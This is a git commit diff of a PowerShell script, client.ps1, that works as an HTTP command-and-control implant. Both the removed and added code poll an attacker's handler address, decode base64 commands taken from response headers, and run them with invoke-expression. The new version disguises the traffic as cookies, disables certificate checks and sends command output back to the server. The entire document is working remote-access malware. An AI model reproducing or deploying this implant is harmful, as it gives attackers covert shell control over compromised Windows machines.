8c3b107ed193959f61a88bc30ef1ed3e7374fd08
op7ic <op7ica@gmail.com>
2015-09-01 15:03:30 +0100

    Update client.ps1

--- client.ps1
+++ client.ps1
@@ -1,21 +1,36 @@
-while (1 -eq 1){
-try{
-# change this to your IP/port
-$url = "http://x.x.x.x:8080/hello"
-# handle proxies and used default creds if needed
-$req = [System.Net.HttpWebRequest]::Create($url);
-$p=[System.Net.WebRequest]::GetSystemWebProxy();
-$p.Credentials=[System.Net.CredentialCache]::DefaultCredentials;
-$req.proxy = $proxy
-# add our header
-$req.Headers.add('CMD','INITIAL')
-$res = $req.GetResponse();
-$x = $res.GetResponseHeader("CMD");
-# decode base64
-$d = [System.Convert]::FromBase64String($x);
-$Ds = [System.Text.Encoding]::UTF8.GetString($d);
-# exec whatever we gave it (can be powershell or just shell commands)
-invoke-expression $Ds;
-$res.Close();
-}catch{}
+#Your handler URL - edit as needed
+$url = "https://192.168.44.1:8081";
+#Magic header - change as needed for both client and the server 
+$m = "737060cd8c284d8af7ad3082f209582d";
+
+function w 
+{ 
+    [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};
+    $r = [System.Net.HttpWebRequest]::Create($url);
+    $r.Headers.Add('If-Match', $m);
+    $p = [System.Net.WebRequest]::GetSystemWebProxy();
+	# handle credetnails
+    $p.Credentials=[System.Net.CredentialCache]::DefaultCredentials;
+    $r.proxy = $proxy;
+    return $r;
+}
+
+while ($true)
+{
+    $r = w;
+    try { $p = $r.GetResponse(); } catch { continue; }
+    $x = $p.GetResponseHeader("Set-Cookie");
+    if (![string]::IsNullOrEmpty($x))
+    {
+        $c = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($x));
+        #invoke and catch any exceptions
+		try { $o = invoke-expression "$c" 2>&1 | Out-String; }
+        catch { $o = $_.Exception| Out-String; }
+		# get output back to the server in cookie
+        $o = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($o))
+        $r = w;
+        $r.Headers.Add('Cookie', $o);
+        $r.GetResponse().close();
+    }
+    $p.close();
 }
